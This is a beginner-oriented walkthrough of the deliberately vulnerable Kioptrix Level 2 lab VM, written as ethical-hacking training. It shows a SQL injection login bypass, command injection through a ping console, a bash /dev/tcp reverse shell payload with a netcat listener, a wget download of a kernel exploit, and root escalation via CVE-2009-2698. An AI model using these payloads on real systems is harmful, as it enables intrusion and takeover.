# Kioptrix Level 2 Walkthrough - Beginner-Friendly Guide  

Welcome to another fun hacking adventure! In this walkthrough, I’ll guide you through hacking *Kioptrix Level 2*, a beginner-friendly virtual machine (VM) designed for learning ethical hacking. If you’ve never done anything like this before, don’t worry—I’ll explain everything in simple terms, including why we do each step.

---

## Introduction  

### What is Kioptrix?  
Kioptrix is a purposely vulnerable virtual machine hosted on VulnHub. The goal is to find and exploit weaknesses in the system to gain complete control, just like a hacker would—but ethically!  

### What Will You Learn?  
- *How to gather information* about a target system.  
- *How to exploit vulnerabilities* like SQL injection and Remote Code Execution (RCE).  
- *How to escalate privileges* to get full control over a system.  

By the end, you’ll have a basic understanding of how hackers break into systems and how you can defend against such attacks.

---

## Step 1: Enumeration  
*Goal:* Find out what services are running on the target system. Think of this step as figuring out what doors and windows are open in a house before deciding how to enter.

### Scanning the Target  
We use a tool called *Nmap* to scan for "open doors" (ports) on the target machine.  

#### Command:  
```bash
nmap -sV -A -oN kio2-nmap 10.0.2.15

-sV: Detects the version of services running on open ports.

-A: Enables aggressive scanning for more detailed information.

-oN kio2-nmap: Saves the output to a file for easy reference.

Target IP: 10.0.2.15 (Replace with your target’s IP).


What We Found:

Nmap tells us that the following ports are open:

22: SSH (used for remote login).

80 and 443: HTTP and HTTPS (websites).

111 and 631: Less common services like rpcbind and CUPS.


Key takeaway: Ports 80 and 443 suggest that a website is hosted on the machine, which will likely be our entry point.


---

Step 2: Exploring the Website

Goal: Find vulnerabilities on the website.

1. Open the target's IP address in a browser (e.g., http://10.0.2.15).


2. You’ll see a login page.



What Do We Do Next?

First, we try common usernames and passwords like admin:admin or root:password, but they don’t work. This suggests the login might be vulnerable to SQL Injection, a common attack where hackers trick the website into giving access by manipulating the database.


---

Step 3: Exploiting SQL Injection

What is SQL Injection?

Websites often use databases to store user login info. SQL Injection works by inserting special characters or commands into input fields to bypass login checks.

How We Do It:

1. Enter the following in the username field:

admin'or 1=1-- -

admin': Ends the SQL query.

or 1=1: A logical condition that is always true.

--: Comments out the rest of the query, bypassing the password check.



2. Use any password (it doesn’t matter).


3. You’ll be logged in successfully!



Why Does This Work?

The website doesn’t properly validate inputs, allowing us to trick its database. This is a security flaw that developers must fix to protect users.


---

Step 4: Exploiting Remote Code Execution (RCE)

Goal: Execute commands on the server remotely.

After bypassing the login, you’ll see a web console. This console is meant to send "ping" commands to test network connectivity, but it doesn’t validate inputs either.

Steps:

1. Try entering:

ping google.com

You’ll see the ping results on the page.


2. What If We Add Our Own Command?
Using the | symbol, we can chain commands to the server. For example:

ping google.com | whoami

This will tell us the user the server is running as.


3. Inject a Reverse Shell
To control the server, we use a tool called Netcat to set up a listener on our machine:

Command on your machine:

nc -lvnp 4444

-l: Listen for incoming connections.

-v: Verbose mode (shows details).

-p 4444: Specifies port 4444 for communication.



4. In the web console, inject this payload:

; bash -i >& /dev/tcp/<YOUR_IP>/4444 0>&1

Replace <YOUR_IP> with your local IP address.



Result: The server connects back to your machine, and you can now execute commands as if you were directly logged into it.




---

Step 5: Privilege Escalation

Goal: Gain full control (root access).

Steps:

1. Identify the Linux Version
Run:

uname -a

This tells us the server is running an old Linux kernel: 2.6.19.



2. Find an Exploit
This version is vulnerable to CVE-2009-2698, a publicly known exploit.


3. Transfer the Exploit to the Server

Start a Python HTTP server on your machine:

python3 -m http.server 8000

On the server, download the exploit:

wget http://<YOUR_IP>:8000/0x82-CVE-2009-2698.c



4. Compile and Execute the Exploit

Compile the exploit:

gcc -o exploit 0x82-CVE-2009-2698.c

Run it:

./exploit



5. Check Your Privileges
Run:

id

If it says uid=0(root), you now have full control of the server!




---

Conclusion

Congratulations! You’ve successfully:

1. Exploited a SQL Injection vulnerability to bypass a login page.


2. Used Remote Code Execution to gain server access.


3. Escalated privileges to root using a Linux kernel exploit.



Lessons Learned:

Always validate inputs to avoid SQL Injection and RCE vulnerabilities.

Keep systems updated to patch known exploits.


This challenge shows why cybersecurity is so important in today’s world. I hope this guide was helpful—see you in the next walkthrough!
